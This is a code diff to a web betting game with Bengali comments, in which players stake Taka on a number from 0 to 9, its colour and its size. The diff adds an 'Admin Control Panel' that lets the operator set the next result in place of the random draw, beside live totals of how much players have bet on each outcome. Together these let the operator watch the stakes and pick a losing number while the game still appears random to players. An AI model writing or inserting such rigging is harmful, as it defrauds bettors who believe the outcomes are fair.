@@ -5257,23 +5257,40 @@ function confirmBet() {
     }, 1000);
 
     // --- মার্কেট প্রসেসিং ---
-    function syncMarket() {
-        const now = Math.floor(Date.now() / 1000);
-        const actualPeriod = Math.floor(now / DURATION);
-        let lastSync = parseInt(localStorage.getItem('last_sync_global') || actualPeriod - 1);
+    
+function syncMarket() {
+    const now = Math.floor(Date.now() / 1000);
+    const actualPeriod = Math.floor(now / DURATION);
+    let lastSync = parseInt(localStorage.getItem('last_sync_global') || actualPeriod - 1);
 
-        if (actualPeriod > lastSync) {
-            for (let p = lastSync + 1; p <= actualPeriod; p++) {
-                const winNum = Math.floor(Math.random() * 10);
-                gameHistory.unshift({ period: p, num: winNum });
-                processBets(p, winNum);
+    if (actualPeriod > lastSync) {
+        for (let p = lastSync + 1; p <= actualPeriod; p++) {
+            // --- অ্যাডমিন কন্ট্রোল লজিক শুরু ---
+            let winNum;
+            const adminFixedNum = localStorage.getItem('admin_next_result');
+
+            // যদি অ্যাডমিন কোনো নম্বর সেট করে থাকে
+            if (adminFixedNum !== null && adminFixedNum !== "") {
+                winNum = parseInt(adminFixedNum);
+                localStorage.removeItem('admin_next_result'); // একবার ব্যবহারের পর মুছে ফেলা
+            } else {
+                // অ্যাডমিন সেট না করলে আগের মতোই র্যান্ডম হবে
+                winNum = Math.floor(Math.random() * 10);
             }
-            localStorage.setItem('game_history_global', JSON.stringify(gameHistory.slice(0, 100)));
-            localStorage.setItem('last_sync_global', actualPeriod);
-        }
-        renderGameHistory();
-    }
+            // --- অ্যাডমিন কন্ট্রোল লজিক শেষ ---
 
+            gameHistory.unshift({ period: p, num: winNum });
+            processBets(p, winNum);
+        }
+        
+        localStorage.setItem('game_history_global', JSON.stringify(gameHistory.slice(0, 100)));
+        localStorage.setItem('last_sync_global', actualPeriod);
+        
+        // বেটিং ডাটা রিসেট করা যাতে নতুন পিরিয়ডে আগের টাকার হিসাব না দেখায়
+        localStorage.removeItem('current_bets'); 
+    }
+    renderGameHistory();
+}
 function processBets(p, winNum) {
     let winColor = (winNum === 0 || winNum === 5) ? 'Violet' : (winNum % 2 === 0 ? 'Red' : 'Green');
     let winSize = winNum >= 5 ? 'Big' : 'Small';
@@ -6628,6 +6645,31 @@ window.onload = () => {
                 <h4 class="fw-bold m-0" id="stat-total-withdraw">৳0</h4>
                 <i class="fas fa-hand-holding-usd position-absolute" style="right: 10px; bottom: 10px; font-size: 25px; opacity: 0.2;"></i>
             </div>
+        </div>
+    </div>
+</div>
+<div id="admin-panel" style="background: #2c3e50; color: white; padding: 20px; border-radius: 15px; margin-top: 20px;">
+    <h3 style="text-align: center; color: #f1c40f;">Admin Control Panel</h3>
+    
+    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; margin-bottom: 15px; text-align: center;">
+        <span style="font-size: 14px;">Next Fixed Number: </span>
+        <strong id="display-fixed-num" style="font-size: 20px; color: #f1c40f;">None</strong>
+    </div>
+
+    <div style="margin-bottom: 20px; text-align: center;">
+        <input type="number" id="next-num-input" min="0" max="9" placeholder="0-9" style="width: 60px; padding: 8px; border-radius: 5px; border: none; text-align: center;">
+        <button onclick="setNextResult()" style="background: #27ae60; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold;">Set Result</button>
+    </div>
+
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+        <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px;">
+            <p>Total Big: <span id="total-big-bet" style="color:#ffa502">0</span> ৳</p>
+            <p>Total Small: <span id="total-small-bet" style="color:#3b82f6">0</span> ৳</p>
+        </div>
+        <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px;">
+            <p style="color:#2ecc71;">Green: <span id="total-green-bet">0</span> ৳</p>
+            <p style="color:#ff4757;">Red: <span id="total-red-bet">0</span> ৳</p>
+            <p style="color:#a55eea;">Violet: <span id="total-violet-bet">0</span> ৳</p>
         </div>
     </div>
 </div>
@@ -10988,7 +11030,78 @@ async function saveToServer() {
 
 // ৩. সাইট রিলোড হলে অটোমেটিক লোড ফাংশন কল করা
 window.addEventListener('load', loadFromServer);
- 
+// --- ১. পরবর্তী নম্বর সেট করার ফাংশন ---
+function setNextResult() {
+    const input = document.getElementById('next-num-input');
+    const nextNum = input.value;
+
+    if (nextNum !== "" && nextNum >= 0 && nextNum <= 9) {
+        // লোকাল স্টোরেজে নম্বরটি সেভ করা
+        localStorage.setItem('admin_next_result', nextNum);
+        
+        // অ্যাডমিন প্যানেলের UI আপডেট
+        checkAdminSettings();
+        
+        document.getElementById('status-msg').innerText = "✅ Next result fixed to: " + nextNum;
+        document.getElementById('status-msg').style.color = "#2ecc71";
+        input.value = ""; // ইনপুট বক্স খালি করা
+    } else {
+        alert("দয়া করে ০ থেকে ৯ এর মধ্যে একটি নম্বর দিন!");
+    }
+}
+
+// --- ২. অ্যাডমিন প্যানেলে কি নম্বর সেট আছে তা চেক করা ---
+function checkAdminSettings() {
+    const fixedNum = localStorage.getItem('admin_next_result');
+    const displayBox = document.getElementById('display-fixed-num');
+    
+    if (displayBox) {
+        if (fixedNum !== null) {
+            displayBox.innerText = fixedNum;
+            displayBox.style.color = "#f1c40f";
+        } else {
+            displayBox.innerText = "None (Random)";
+            displayBox.style.color = "#999";
+        }
+    }
+}
+
+// --- ৩. লাইভ বেটিং স্ট্যাটাস (টাকার হিসাব) আপডেট করা ---
+function updateAdminStats() {
+    // ইউজারের বেটিং ডাটা রিড করা
+    const allBets = JSON.parse(localStorage.getItem('current_bets') || '[]');
+    
+    let stats = {
+        big: 0, small: 0, green: 0, red: 0, violet: 0
+    };
+
+    allBets.forEach(bet => {
+        const amount = Number(bet.amount) || 0;
+        // সাইজ হিসাব
+        if(bet.type === 'Big') stats.big += amount;
+        if(bet.type === 'Small') stats.small += amount;
+        
+        // কালার হিসাব
+        if(bet.color === 'green') stats.green += amount;
+        if(bet.color === 'red') stats.red += amount;
+        if(bet.color === 'violet') stats.violet += amount;
+    });
+
+    // অ্যাডমিন প্যানেলের UI এলিমেন্টগুলো আপডেট করা
+    if(document.getElementById('total-big-bet')) document.getElementById('total-big-bet').innerText = stats.big;
+    if(document.getElementById('total-small-bet')) document.getElementById('total-small-bet').innerText = stats.small;
+    if(document.getElementById('total-green-bet')) document.getElementById('total-green-bet').innerText = stats.green;
+    if(document.getElementById('total-red-bet')) document.getElementById('total-red-bet').innerText = stats.red;
+    if(document.getElementById('total-violet-bet')) document.getElementById('total-violet-bet').innerText = stats.violet;
+}
+
+// --- ৪. অটোমেটিক রান করা (প্রতি সেকেন্ডে) ---
+setInterval(() => {
+    updateAdminStats();
+    checkAdminSettings();
+}, 1000);
+
+
 </script>
 <script src="//code.jivosite.com/widget/Fmb29gqNCO" async></script>
 
